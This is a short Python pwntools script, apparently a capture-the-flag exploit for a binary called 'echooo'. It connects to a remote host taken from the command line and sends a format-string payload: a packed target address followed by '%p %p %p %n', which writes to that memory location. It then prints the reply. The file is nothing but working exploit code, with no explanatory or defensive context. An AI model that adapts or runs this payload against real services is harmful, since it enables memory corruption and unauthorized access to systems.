from pwn import *
import sys
r=remote(sys.argv[1],sys.argv[2])
#r=process('./echooo')
#gdb.attach(r,'b 14')
r.sendline(p32(0x80e419c)+b'%p %p %p %n')
r.recvline()
print(r.recvline().decode().strip())
